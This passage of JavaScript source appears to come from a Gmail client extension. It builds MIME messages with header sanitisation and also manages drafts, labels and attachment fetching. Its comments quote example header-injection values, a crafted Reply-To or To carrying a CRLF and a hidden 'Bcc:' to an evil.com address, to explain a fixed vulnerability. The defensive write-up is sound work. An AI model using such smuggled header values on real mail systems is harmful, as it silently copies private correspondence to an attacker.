    /* Never split a UTF-8 sequence: continuation bytes are 10xxxxxx, so walk
       back to the lead byte. Guarded against runaway on malformed input. */
    while (end > i && end < bytes.length && (bytes[end] & 0xc0) === 0x80) end--;
    if (end === i) end = Math.min(i + WRAP, bytes.length); // pathological: take the chunk
    let bin = '';
    for (let k = i; k < end; k++) bin += String.fromCharCode(bytes[k]);
    words.push(`=?UTF-8?B?${btoa(bin)}?=`);
    i = end;
  }
  /* CRLF + SPACE is the fold: the space is what marks a continuation line,
     and RFC 2047 §6.2 says whitespace BETWEEN encoded-words is not part of
     the decoded text, so this adds nothing to the subject the user sees. */
  return words.join('\r\n ');
}

/** base64url, which is what the Gmail API wants for a raw RFC 2822 message. */
function b64urlEncode(text) {
  const bytes = new TextEncoder().encode(text);
  let bin = '';
  for (const b of bytes) bin += String.fromCharCode(b);
  return btoa(bin).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}

/**
 * Build an RFC 2822 message.
 *
 * Deliberately hand-built rather than pulled from a MIME library: the whole
 * extension has zero runtime dependencies, and a correct multipart/alternative
 * for this narrow case is about thirty lines. Anything a library would add
 * beyond that (attachments with content-disposition, nested multiparts) is not
 * something this build sends.
 *
 * @param {{to:string, cc?:string, bcc?:string, subject:string, body:string,
 *   inReplyTo?:string, references?:string, from?:string,
 *   attachments?:any[]}} m
 */
export function buildMime(m) {
  const boundary = `bmm_${Math.random().toString(36).slice(2)}`;

  /*
   * EVERY HEADER VALUE IS SCRUBBED. THIS WAS A REAL, EXPLOITABLE BUG.
   *
   * `safeHeaderValue` and `safeFilename` existed and were applied to
   * ATTACHMENT metadata only. To, Cc, Bcc, From, In-Reply-To and References
   * were interpolated raw, so a CRLF in any of them injected an arbitrary
   * header -- classically a hidden `Bcc:`.
   *
   * WHY THIS IS WORSE THAN "THE USER COULD TYPE IT INTO THEIR OWN MESSAGE".
   *
   * `To` is not only typed. `buildReply()` fills it from the INBOUND message's
   * Reply-To or From header, which is entirely attacker-controlled. A crafted
   * message with
   *
   *     Reply-To: prof@bits.ac.in\r\nBcc: harvest@evil.com
   *
   * meant that hitting Reply -- an action with no warning attached -- silently
   * copied the reply to a third party. Verified end to end before fixing:
   * buildReply produced the poisoned string and buildMime emitted the Bcc.
   *
   * Scrubbing happens HERE, at the last gate before the wire, rather than in
   * buildReply. There are three producers of these fields (compose, reply,
   * the outbox replaying a stored draft) and one consumer; fixing the consumer
   * cannot be bypassed by a fourth producer added later.
   *
   * BARE LF COUNTS. Some MTAs and parsers accept a lone \n as a header
   * separator, so stripping only \r\n is not enough -- `safeHeaderValue`
   * already handles both, which is why it is reused rather than reinvented.
   */
  const headers = [
    m.from ? `From: ${safeAddressHeader(m.from)}` : null,
    /* An empty To: is malformed, and buildMime is fed by the outbox replaying
       stored drafts and by buildReply, not only by the compose UI -- so the
       guard belongs here at the wire rather than only in the form (round 8,
       M-9). Omitting the header is correct: a message with no To but a Bcc
       is legal, a message with a blank To is not. */
    safeAddressHeader(m.to) ? `To: ${safeAddressHeader(m.to)}` : null,
    m.cc ? `Cc: ${safeAddressHeader(m.cc)}` : null,
    m.bcc ? `Bcc: ${safeAddressHeader(m.bcc)}` : null,
    /*
     * SUBJECT GETS THE SCRUB TOO (bug-hunt #1). encodeHeader alone passes a
     * pure-ASCII subject through unchanged, and an ASCII CR/LF in it was the
     * one remaining header-injection path -- reachable without typing
     * anything, because buildReply copies the INBOUND subject, which is
     * attacker-controlled. Non-ASCII subjects were already safe: the
     * base64 encoded-word cannot carry a line break.
     *
     * Everything after the first line break is CUT, not folded in: the same
     * "the attacker's text must not reach the wire at all" standard the
     * address headers hold. A legitimate subject never contains a raw
     * line break; a multi-line compose input or a crafted inbound subject
     * has nothing honest on the later lines.
     */
    `Subject: ${encodeHeader(safeSubject(m.subject))}`,
    // Threading. Without these two a reply starts a NEW conversation, which is
    // the single most visible way a mail client looks broken.
    m.inReplyTo ? `In-Reply-To: ${safeIdHeader(m.inReplyTo)}` : null,
    m.references ? `References: ${safeIdHeader(m.references)}` : null,
    'MIME-Version: 1.0',
  ].filter(Boolean);

  const plain = m.body;
  const html = plainToHtml(m.body);

  /*
   * The body is always multipart/alternative: a text/plain fallback beside the
   * HTML, so clients that do not render HTML still show something readable.
   */
  const altParts = [
    `--${boundary}`,
    'Content-Type: text/plain; charset="UTF-8"',
    'Content-Transfer-Encoding: 8bit',
    '',
    plain,
    '',
    `--${boundary}`,
    'Content-Type: text/html; charset="UTF-8"',
    'Content-Transfer-Encoding: 8bit',
    '',
    html,
    '',
    `--${boundary}--`,
    '',
  ];

  const files = Array.isArray(m.attachments) ? m.attachments.filter(Boolean) : [];

  /*
   * NO ATTACHMENTS: EMIT EXACTLY WHAT WE ALWAYS DID.
   *
   * Wrapping every message in multipart/mixed "for consistency" would add a
   * layer to the 99% case to serve the 1%, and some clients render the extra
   * nesting badly. The common path is untouched.
   */
  if (!files.length) {
    return [
      ...headers,
      `Content-Type: multipart/alternative; boundary="${boundary}"`,
    ].join('\r\n') + `\r\n\r\n${altParts.join('\r\n')}`;
  }

  /*
   * WITH ATTACHMENTS: multipart/mixed WRAPPING the alternative, not replacing
   * it. Flattening the alternative away would lose the text/plain fallback.
   * The outer boundary must differ from the inner one or a parser cannot tell
   * where the nested part ends.
   */
  const outer = `${boundary}_mixed`;
  const body = [
    `--${outer}`,
    `Content-Type: multipart/alternative; boundary="${boundary}"`,
    '',
    ...altParts,
  ];

  for (const f of files) {
    const name = safeFilename(f.filename);
    body.push(
      `--${outer}`,
      `Content-Type: ${safeHeaderValue(f.mimeType || 'application/octet-stream')}; name="${name}"`,
      `Content-Disposition: attachment; filename="${name}"`,
      'Content-Transfer-Encoding: base64',
      '',
      // Already base64 from the reader; fold to 76 columns as RFC 2045 asks.
      String(f.data || '').replace(/\s+/g, '').replace(/(.{76})/g, '$1\r\n'),
      ''
    );
  }
  body.push(`--${outer}--`, '');

  return [
    ...headers,
    `Content-Type: multipart/mixed; boundary="${outer}"`,
  ].join('\r\n') + `\r\n\r\n${body.join('\r\n')}`;
}

/**
 * The subject scrub (bug-hunt #1): keep only the first line, then cap it.
 * Kept separate from safeHeaderValue because "delete the line break" is
 * exactly the weaker strategy the address headers document and reject --
 * for a SUBJECT, cutting is right: text after a raw line break is either an
 * injection or a multiline paste, and neither belongs in the header.
 */
function safeSubject(v) {
  return String(v ?? '').split(/[\r\n\u2028\u2029]/)[0].slice(0, 1000);
}

/**
 * Make a filename safe to sit inside a quoted MIME parameter.
 *
 * A filename is ATTACKER-CONTROLLED the moment you forward something. An
 * unescaped `"` closes the parameter early and a CRLF injects an entire new
 * header -- which turns a forward into a header-injection primitive capable of
 * adding a Bcc. Strip the line breaks, strip the quotes, and cap the length.
 */
function safeFilename(name) {
  /*
   * ESCAPED, NOT DELETED (round 8, M-10). Stripping the quote was safe but
   * LOSSY and silent: `a"b.pdf` arrived as `ab.pdf`, so the user's file
   * quietly changed name in transit. RFC 2822 quoted-strings allow a
   * backslash escape, which preserves the character while still closing the
   * injection: the `"` can no longer terminate the parameter early.
   *
   * Backslashes are escaped FIRST, or escaping the quote would produce a
   * dangling escape on a filename that already contained one.
   */
  return String(name || 'attachment')
    .replace(/[\r\n]+/g, ' ')
    .replace(/\\/g, '\\\\')
    .replace(/"/g, '\\"')
    .slice(0, 200)
    .trim() || 'attachment';
}

/** Same rule for any value we interpolate into a header. */
function safeHeaderValue(v, max = 200) {
  /*
   * Strips CR, LF and the quote character, then caps the length.
   *
   * The cap is a parameter because 200 is right for a filename or a MIME type
   * and WRONG for a recipient list: a reply-all on a project thread runs well
   * past 200 characters, and silently truncating it would drop recipients from
   * a message the user believes they sent to everyone. Address headers pass a
   * generous limit; the RFC 5322 line-length guidance is about folding, which
   * Gmail's API does for us.
   */
  return String(v || '').replace(/[\r\n\u2028\u2029"]+/g, '').slice(0, max);
}

/**
 * Address headers: the same scrubbing, with NO length cap.
 *
 * A generous cap was tried first (2000 characters) and was still wrong. A
 * reply-all to a 60-person project thread is ~2500 characters, and the cap
 * silently dropped twelve recipients -- caught by measuring it rather than by
 * reasoning about it.
 *
 * Truncating an address list is DATA LOSS in the direction the user cannot
 * see: the message sends, looks fine in Sent, and a third of the recipients
 * never receive it. The cap was defending against nothing -- length is not the
 * attack, CRLF is, and that is stripped regardless. Gmail's API rejects a
 * genuinely absurd header itself, which is the right place for that limit.
 */
function safeAddressHeader(v) {
  /*
   * ADDRESS HEADERS ARE REBUILT FROM PARSED TOKENS, NOT PATCHED.
   *
   * Two weaker fixes were tried first and both were wrong, which is why this
   * one is written the way it is.
   *
   *   DELETE the line break   -> "a@b.com\r\nBcc: x@evil.com" becomes
   *                              "a@b.comBcc: x@evil.com": no header is
   *                              injected, but the recipient is now one
   *                              malformed token.
   *
   *   REPLACE it with a space -> "a@b.com Bcc: x@evil.com": still on the To
   *                              line, and space-separated addresses ARE legal
   *                              in some parsers, so the attacker's address
   *                              may simply be delivered to.
   *
   * Neither is acceptable, because the goal is not "no extra header" -- it is
   * THE ATTACKER'S ADDRESS MUST NOT REACH THE WIRE AT ALL.
   *
   * So the value is split on line breaks and on commas, and every resulting
   * token is kept only if it looks like a real recipient: an optional display
   * name followed by one address, or a bare address. `Bcc: x@evil.com` matches
   * neither -- a header name with a colon is not an address -- so it is
   * discarded rather than reshaped.
   *
   * Regular commas are preserved, so a legitimate reply-all is untouched, and
   * there is no length cap: truncating a recipient list is silent data loss in
   * the direction the user cannot see.
   */
  const ADDRESS = /^(?:[^<>,:;"]{0,120}<[^<>@\s]+@[^<>@\s]+>|[^<>,:;"\s]+@[^<>,:;"\s]+)$/;

  return String(v || '')
    .split(/[\r\n\u2028\u2029,]+/)
    .map((tok) => tok.replace(/"/g, '').trim())
    .filter((tok) => tok && ADDRESS.test(tok))
    .join(', ');
}

/**
 * Message-ID style headers (In-Reply-To, References).
 *
 * These are `<id@host>` tokens, space separated, so they need the same
 * "rebuild from valid tokens" treatment but a different shape of token.
 */
function safeIdHeader(v) {
  return String(v || '')
    .split(/[\r\n\u2028\u2029\s]+/)
    .map((t) => t.trim())
    .filter((t) => /^<[^<>\s]+>$/.test(t))
    .join(' ');
}


/** Minimal, escaped plain-text -> HTML. Never interpolates raw user text. */
function plainToHtml(text) {
  const esc = String(text)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
  return `<div style="white-space:pre-wrap;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-serif">${esc}</div>`;
}

/**
 * Re-fetch the attachments of a Gmail draft being edited (bug-hunt P0).
 *
 * Editing a draft opens it with attachment METADATA only (filename, type,
 * size, attachmentId) -- carrying megabytes through the message channel just
 * to display a chip would be the same waste the compose panel avoids. The
 * bytes are fetched HERE, at the last gate before the wire, for entries that
 * have no `data` yet.
 *
 * A preserved attachment that cannot be recovered THROWS rather than sending
 * without it: the silent alternative is exactly the data loss this exists to
 * end. The outbox turns the throw into a visible, retryable failure.
 */
export async function hydrateDraftAttachments(draft) {
  const atts = Array.isArray(draft?.attachments) ? draft.attachments : [];
  if (!atts.length) return draft;
  const out = [];
  for (const f of atts) {
    if (!f || typeof f.filename !== 'string') continue;
    if (typeof f.data === 'string' && f.data) { out.push(f); continue; }
    if (!f.attachmentId || !f.messageId) {
      throw new Error(`Cannot recover attachment \u201c${f.filename}\u201d: no source to refetch it from`);
    }
    let dataUrl;
    try {
      dataUrl = await getAttachment(f.messageId, f.attachmentId, f.mimeType);
    } catch (err) {
      /*
       * Classify the failure. A Gmail 4xx means the part is GONE and no
       * amount of waiting will bring it back -- that is the lost-attachment
       * class, which the outbox takes straight to stuck. A network or 5xx
       * error stays retryable by re-throwing unchanged.
       */
      /* The status is a field now (EXT2-C2's taxonomy), so this no longer
         depends on the prose. A 429 is a 4xx that is emphatically NOT
         permanent, and the old regex swallowed it into the lost-attachment
         class — a rate-limited send became "Gmail refused it", permanently
         stuck, instead of a retry. */
      const status = /** @type {any} */ (err)?.status;
      if (typeof status === 'number' && status >= 400 && status < 500 && status !== 429) {
        throw new Error(`Could not read attachment \u201c${f.filename}\u201d: Gmail refused it`);
      }
      throw err;
    }
    const at = String(dataUrl).indexOf(',');
    if (at === -1) throw new Error(`Could not read attachment \u201c${f.filename}\u201d`);
    out.push({ ...f, data: dataUrl.slice(at + 1) });
  }
  return { ...draft, attachments: out };
}

/**
 * Send a message.
 * `threadId` keeps a reply inside its conversation.
 */
export async function sendMessage(mime, threadId) {
  const body = { raw: b64urlEncode(mime) };
  if (threadId) body.threadId = threadId;
  return api('/messages/send', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
    retry: false,
  });
}

/**
 * Find the draft that owns a message, and return it ready for editing.
 *
 * The Drafts mailbox is fetched by LABEL, so the app holds message ids while
 * the drafts API is keyed by DRAFT id -- and they are different. Without this
 * lookup a draft could be listed and never opened, which is exactly the state
 * the product was in.
 *
 * Returns the draft id alongside the RAW message resource. Parsing stays in
 * the worker beside extractBody, which already knows how to read a Gmail
 * payload -- a second parser is how two readers drift.
 */
export async function getDraftForMessage(messageId) {
  // Page through ALL drafts, not just the first 500: a heavy draft folder
  // used to make "continue drafting" silently fail to find the message
  // (cross-audit P6). The reply path calls this per message, so the common
  // case (hit on page 1) costs the same single request as before.
  let pageToken = '';
  // Capped (bug-hunt #29): a repeated nextPageToken from the API used to be
  // an infinite loop. 20 pages is 10,000 drafts -- past any real folder, and
  // a draft that deep is a full-folder problem, not a hang.
  for (let page = 0; page < 20; page++) {
    const q = pageToken
      ? `/drafts?maxResults=500&pageToken=${encodeURIComponent(pageToken)}`
      : '/drafts?maxResults=500';
    const list = await api(q);
    const hit = (list.drafts || []).find((d) => d.message?.id === messageId);
    if (hit) {
      const full = await api(`/drafts/${encodeURIComponent(hit.id)}?format=full`);
      return { draftId: hit.id, message: full.message || {} };
    }
    pageToken = list.nextPageToken;
    if (!pageToken) return null;
  }
  return null;
}

/** Save a draft rather than sending. */
export async function saveDraft(mime, threadId, draftId) {
  const message = { raw: b64urlEncode(mime) };
  if (threadId) message.threadId = threadId;
  const payload = JSON.stringify({ message });
  if (draftId) {
    return api(`/drafts/${encodeURIComponent(draftId)}`, {
      method: 'PUT',
      headers: { 'Content-Type': 'application/json' },
      body: payload,
    });
  }
  return api('/drafts', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: payload,
    retry: false,
  });
}

// ============================================================================
// LABELS
// ============================================================================

export async function listLabels() {
  const data = await api('/labels');
  return (data.labels || [])
    .filter((l) => l.type === 'user')
    .map((l) => ({ id: l.id, name: l.name }))
    .sort((a, b) => a.name.localeCompare(b.name));
}

export async function createLabel(name) {
  return api('/labels', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      name,
      labelListVisibility: 'labelShow',
      messageListVisibility: 'show',
    }),
  });
}

/**
 * Find a label by name, creating it if it does not exist.
 *
 * Gmail returns 409 for a duplicate name, and two callers racing (a snooze and
 * a wake at the same moment) will do exactly that. So a failed create falls
 * back to a re-list rather than propagating: by definition the label now
 * exists, which is all the caller wanted.
 *
 * The id is cached because this is on the path of every snooze, and the id of
 * a label never changes.
 */
const labelIdCache = new Map();

export async function ensureLabel(name) {
  if (labelIdCache.has(name)) return labelIdCache.get(name);

  const existing = (await api('/labels')).labels || [];
  const hit = existing.find((l) => l.name === name);
  if (hit) {
    labelIdCache.set(name, hit.id);
    return hit.id;
  }

  try {
    const made = await createLabel(name);
    if (made?.id) {
      labelIdCache.set(name, made.id);
      return made.id;
    }
  } catch {
    // Fall through: most likely a race, and the re-list below settles it.
  }

  const after = (await api('/labels')).labels || [];
  const found = after.find((l) => l.name === name);
  if (!found) throw new Error(`Could not create the "${name}" label`);
  labelIdCache.set(name, found.id);
  return found.id;
}

/**
 * Test seam AND production sign-out hook (V2 P1-12): label ids are
 * account-scoped, so the cache must die with the session that filled it.
 */
export function _clearLabelCache() {
  labelIdCache.clear();
}

// ============================================================================
// ATTACHMENTS
// ============================================================================

/**
 * Fetch one attachment as a data: URL.
 *
 * Returned as a data URL rather than a blob because the worker has no DOM and
 * therefore no URL.createObjectURL. The app turns it into a download. Gmail's
 * attachment payloads are base64url, which is NOT what a data: URL wants, so
 * the padding and alphabet are converted here.
 */
export async function getAttachment(messageId, attachmentId, mimeType) {
  const data = await api(
    `/messages/${encodeURIComponent(messageId)}/attachments/${encodeURIComponent(attachmentId)}`
  );
  const b64 = String(data.data || '').replace(/-/g, '+').replace(/_/g, '/');
  const padded = b64 + '='.repeat((4 - (b64.length % 4)) % 4);
  /*
   * The MIME type is ATTACKER-CONTROLLED (it comes off the message), and it
   * is interpolated into the data: URL (bug-hunt #5). Anything that is not
   * a plain type/subtype token -- parameters, commas, whitespace, a second
   * scheme -- degrades to octet-stream rather than reaching the URL.
   */
  const mt = /^[a-zA-Z0-9!#$&^_.+-]+\/[a-zA-Z0-9!#$&^_.+-]+$/.test(mimeType || '')
    ? mimeType
    : 'application/octet-stream';
  return `data:${mt};base64,${padded}`;
}
